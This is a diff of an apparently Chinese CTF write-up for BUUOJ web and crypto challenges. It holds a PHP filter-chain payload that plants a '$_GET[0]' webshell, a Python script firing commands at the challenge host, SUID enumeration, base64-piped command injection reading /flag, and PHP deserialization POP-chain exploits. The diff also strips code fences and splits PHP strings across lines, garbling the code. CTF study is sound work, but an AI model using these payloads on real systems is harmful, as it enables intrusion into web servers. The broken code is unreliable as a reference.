@@ -68,27 +68,12 @@ else
 {
 die("Noooo0");
 }
-```
-
-
-
-```
 ...
 '4' => 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2'
 # 有_
 ....
-```
-
-
-
-```
 # <?=`$_GET[0]`;;/*
 base64_payload = "PD89YCRfR0VUWzBdYDs7Lyo"
-```
-
-
-
-```
 import requests
 
 url = "http://80.endpoint-f0cb7de3c6d445ca9916505908395850.dasc.buuoj.cn:81/"
@@ -139,24 +124,14 @@ filters += "convert.base64-decode"
 
 final_payload = f"php://filter/{filters}/resource={file_to_use}"
 
-#print(final_payload)
+    #print(final_payload)
 r = requests.get(url, params={
     "0": command,
     "file": final_payload
 })
 
 print(r.text)
-```
-
-
-
-```
 /?file=final_payload&0=find+/+-user+root+-perm+-4000+-print
-```
-
-
-
-```
 /bin/su
 /bin/umount
 /bin/mount
@@ -166,11 +141,6 @@ print(r.text)
 /usr/bin/gpasswd
 /usr/bin/chsh
 /usr/bin/passwd
-```
-
-
-
-```
 ouo@GOTA:~$ echo "date -f /flag 2>&1" | base64
 ZGF0ZSAtZiAvZmxhZyAyPiYxCg==
 ouo@GOTA:~$ echo ZGF0ZSAtZiAvZmxhZyAyPiYxCg==|base64 -d
@@ -178,35 +148,10 @@ date -f /flag 2>&1
 ouo@GOTA:~$ echo ZGF0ZSAtZiAvZmxhZyAyPiYxCg==|base64 -d | sh
 date: invalid date ‘Tao By ACT.’
 ouo@GOTA:~$
-```
-
-
-
-```
 /?file=final_payload&0=echo+ZGF0ZSAtZiAvZmxhZyAyPiYxCg==|base64+-d|sh
-```
-
-
-
-```
 $this->c1 指向 new bei() 可以调用bei类的__set()魔术方法
-```
-
-
-
-```
 $this->b1 指向new yang() 可以调用yang类的__toString()魔术方法
-```
-
-
-
-```
 $this->y1可控，这里可以执行phpinfo函数
-```
-
-
-
-```
 <?php
 error_reporting("0");
 class cheng
@@ -241,26 +186,21 @@ class yang{
 $o = new cheng();
 echo serialize($o);
 ?>
-```
-
-
-
-```
-Test::getFlag()->Fun::__call(绕__wakeup) -> A::__get() -> B::__destruct()
+Test::
+getFlag()->Fun::
+__call(绕__wakeup) -> A::
+__get() -> B::
+__destruct()
 # A->a = Fun()
 # B->a = A()
 
 # __call 通过call_user_func_array调用数组传参 -> Fun->func=[new Test,'getFlag']
-```
-
-
-
-```
 <?php
 class Fun{
     private $func;
     public function __construct(){
-        $this->func = [new Test,'getFlag']; // or $this->func = "Test::getFlag"
+        $this->func = [new Test,'getFlag']; // or $this->func = "Test::
+getFlag"
     }
 }
 
@@ -287,11 +227,6 @@ $b->a = $a;
 $aser = serialize($b);
 $ser = str_replace('"Fun":1:','"Fun":2:',$aser);
 echo urlencode($ser);
-```
-
-
-
-```
 # chao code.
 <?php
 class B{
@@ -312,7 +247,8 @@ class Fun{
     private $func = 'call_user_func_array';
     public function __construct()
     {
-        $this->func ="Test::getFlag";
+        $this->func ="Test::
+getFlag";
     }
 }
 $o = array(new B, new B);
@@ -320,11 +256,6 @@ $tmp = "i:0;".serialize(new B);
 $a =  serialize($o);
 $z = str_replace($tmp,$tmp." ",$a);
 echo urlencode(str_replace('O:3:"Fun":1:','O:3:"Fun":2:',$z));
-```
-
-
-
-```
 Tao in ~Downloads λ ciphey.exe -f .26.txt -C regex -p regex.regex=flag
 ╭────────────────────────────────────────────────────────────╮
 │ Formats used:                                          │
@@ -333,11 +264,6 @@ Tao in ~Downloads λ ciphey.exe -f .26.txt -C regex -p regex.regex=fla
 │    base32                                                  │
 │    utf8Plaintext: "flag{5dcf3d3407891ba725ffd13224de5435}" │
 ╰────────────────────────────────────────────────────────────╯
-```
-
-
-
-```
 ciphey.exe -f .vig.txt
 # 跑了半个小时，发现key->gwhtgwht,还有个密码，但密码不对
 ```
